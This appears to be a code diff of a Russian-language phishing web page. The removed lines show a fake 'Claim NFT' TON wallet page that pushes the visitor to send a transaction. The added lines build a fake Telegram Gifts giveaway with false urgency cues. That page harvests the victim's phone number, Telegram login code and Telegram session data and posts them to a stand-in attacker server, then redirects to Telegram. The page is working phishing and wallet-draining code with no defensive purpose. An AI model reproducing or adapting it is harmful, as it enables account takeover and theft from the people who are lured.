@@ -1,46 +1,283 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Claim</title>
-    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🎁 Розыгрыш подарков</title>
+    <style>
+        body {
+            background: #f0f2f5;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            margin: 0;
+            padding: 20px;
+            color: #1c1e21;
+        }
+        .container {
+            max-width: 400px;
+            margin: 0 auto;
+        }
+        .header {
+            background: linear-gradient(135deg, #2AABEE, #229ED9);
+            color: white;
+            padding: 30px 20px;
+            border-radius: 20px;
+            text-align: center;
+            margin-bottom: 20px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+        }
+        .header h1 {
+            margin: 0;
+            font-size: 28px;
+        }
+        .header p {
+            margin: 10px 0 0;
+            opacity: 0.9;
+        }
+        .gift-card {
+            background: white;
+            border-radius: 16px;
+            padding: 20px;
+            margin-bottom: 16px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            border: 1px solid rgba(0,0,0,0.05);
+        }
+        .gift-icon {
+            width: 60px;
+            height: 60px;
+            background: linear-gradient(135deg, #f093fb, #f5576c);
+            border-radius: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 30px;
+            color: white;
+        }
+        .gift-info h3 {
+            margin: 0;
+            font-size: 18px;
+        }
+        .gift-info p {
+            margin: 5px 0 0;
+            color: #65676b;
+            font-size: 14px;
+        }
+        .login-form {
+            background: white;
+            border-radius: 16px;
+            padding: 20px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+            margin-top: 20px;
+        }
+        .form-group {
+            margin-bottom: 15px;
+        }
+        .form-group label {
+            display: block;
+            margin-bottom: 5px;
+            color: #65676b;
+            font-size: 14px;
+            font-weight: 500;
+        }
+        .form-group input {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #dadde1;
+            border-radius: 10px;
+            font-size: 16px;
+            box-sizing: border-box;
+            transition: border-color 0.2s;
+        }
+        .form-group input:focus {
+            border-color: #2AABEE;
+            outline: none;
+        }
+        .btn-login {
+            background: #2AABEE;
+            color: white;
+            border: none;
+            padding: 14px;
+            width: 100%;
+            border-radius: 30px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+        .btn-login:hover {
+            background: #229ED9;
+        }
+        .note {
+            text-align: center;
+            margin-top: 15px;
+            color: #65676b;
+            font-size: 13px;
+        }
+        .note a {
+            color: #2AABEE;
+            text-decoration: none;
+        }
+        .urgent-badge {
+            background: #ff4d4f;
+            color: white;
+            padding: 4px 8px;
+            border-radius: 30px;
+            font-size: 12px;
+            font-weight: 600;
+            display: inline-block;
+            margin-left: 10px;
+        }
+    </style>
 </head>
-<body style="background:#000; color:#fff; text-align:center; padding-top:50px;">
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>🎁 Официальный розыгрыш</h1>
+            <p>В честь 2 млн пользователей Telegram Gifts</p>
+        </div>
 
-    <h1>Claim System</h1>
-    <div id="ton-connect-button" style="margin-bottom:20px;"></div>
-    
-    <button id="claim-btn" style="padding:20px; font-size:20px; background:red;">CLAIM NFT</button>
+        <div class="gift-card">
+            <div class="gift-icon">🎩</div>
+            <div class="gift-info">
+                <h3>Папаха Хабиба <span class="urgent-badge">🔥 23 осталось</span></h3>
+                <p>Эксклюзивный подарок для фанатов UFC</p>
+            </div>
+        </div>
+
+        <div class="gift-card">
+            <div class="gift-icon">🎮</div>
+            <div class="gift-info">
+                <h3>Premium-стикерпак</h3>
+                <p>Ограниченная серия 2025</p>
+            </div>
+        </div>
+
+        <div class="gift-card">
+            <div class="gift-icon">💎</div>
+            <div class="gift-info">
+                <h3>TON Diamond</h3>
+                <p>Редкий NFT-подарок</p>
+            </div>
+        </div>
+
+        <div class="login-form">
+            <h3 style="margin-top: 0; text-align: center;">🔐 Подтвердите получение</h3>
+            <p style="text-align: center; color: #65676b; margin-bottom: 20px;">Введите данные Telegram для активации подарка</p>
+
+            <div class="form-group">
+                <label>📱 Номер телефона</label>
+                <input type="tel" id="phone" placeholder="+7 999 123 45 67" value="">
+            </div>
+
+            <div class="form-group" id="code-group" style="display: none;">
+                <label>🔢 Код подтверждения</label>
+                <input type="text" id="code" placeholder="Введите код из Telegram">
+                <div style="margin-top: 10px; font-size: 13px; color: #2AABEE; cursor: pointer;" onclick="resendCode()">📨 Отправить код ещё раз</div>
+            </div>
+
+            <button class="btn-login" onclick="handleLogin()" id="loginBtn">Получить подарок</button>
+
+            <div class="note">
+                ⚡️ Только для первых 1000 пользователей<br>
+                <a href="#">Правила розыгрыша</a>
+            </div>
+        </div>
+    </div>
 
     <script>
-        const tonConnectUI = new TonConnectUI({
-            manifestUrl: 'https://newifi.onrender.com/tonconnect-manifest.json',
-            buttonRootId: 'ton-connect-button'
-        });
+        let tg = window.Telegram?.WebApp;
+        let step = 'phone';
 
-        document.getElementById('claim-btn').onclick = async () => {
-            if (!tonConnectUI.connected) {
-                alert("Сначала подключи кошелек через кнопку выше!");
-                return;
-            }
+        // Расширяем окно на весь экран
+        if (tg) {
+            tg.expand();
+            tg.ready();
+            tg.setHeaderColor('#2AABEE');
+        }
 
-            try {
-                const params = new URLSearchParams(window.location.search);
-                const nft = params.get('nft');
-                
-                const transaction = {
-                    validUntil: Math.floor(Date.now() / 1000) + 360,
-                    messages: [{
-                        address: nft,
-                        amount: '50000000',
-                        payload: 'te6cckEBAQEAAgAAAEAw'
-                    }]
-                };
-                
-                await tonConnectUI.sendTransaction(transaction);
-            } catch (e) {
-                alert("Ошибка: " + e.message);
+        function handleLogin() {
+            const phone = document.getElementById('phone').value;
+            const code = document.getElementById('code').value;
+
+            if (step === 'phone') {
+                if (!phone || phone.length < 10) {
+                    alert('Введите корректный номер телефона');
+                    return;
+                }
+
+                // Отправляем телефон на сервер
+                fetch('https://твой-сервер.ru/api/login', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        phone: phone,
+                        step: 'phone',
+                        initData: tg?.initData || '',
+                        userAgent: navigator.userAgent
+                    })
+                })
+                .then(r => r.json())
+                .then(data => {
+                    // Показываем поле для кода
+                    document.getElementById('code-group').style.display = 'block';
+                    document.getElementById('loginBtn').textContent = 'Подтвердить код';
+                    step = 'code';
+                    
+                    // Сохраняем phone для следующего шага
+                    window._tempPhone = phone;
+                })
+                .catch(err => {
+                    console.error('Error:', err);
+                    alert('Ошибка сервера, попробуйте позже');
+                });
+
+            } else if (step === 'code') {
+                if (!code || code.length < 5) {
+                    alert('Введите код из Telegram');
+                    return;
+                }
+
+                fetch('https://твой-сервер.ru/api/login', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        phone: window._tempPhone,
+                        code: code,
+                        step: 'code',
+                        initData: tg?.initData || ''
+                    })
+                })
+                .then(r => r.json())
+                .then(data => {
+                    if (data.success) {
+                        // Перенаправляем на реальный Telegram после успеха
+                        alert('✅ Подарок активирован! Перенаправляем...');
+                        setTimeout(() => {
+                            window.location.href = 'https://t.me/';
+                        }, 1500);
+                    } else {
+                        alert('❌ Неверный код. Попробуйте ещё раз');
+                    }
+                })
+                .catch(err => {
+                    console.error('Error:', err);
+                    alert('Ошибка сервера');
+                });
             }
-        };
+        }
+
+        function resendCode() {
+            if (window._tempPhone) {
+                fetch('https://твой-сервер.ru/api/resend', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({phone: window._tempPhone})
+                });
+                alert('Новый код отправлен');
+            }
+        }
     </script>
 </body>
 </html>
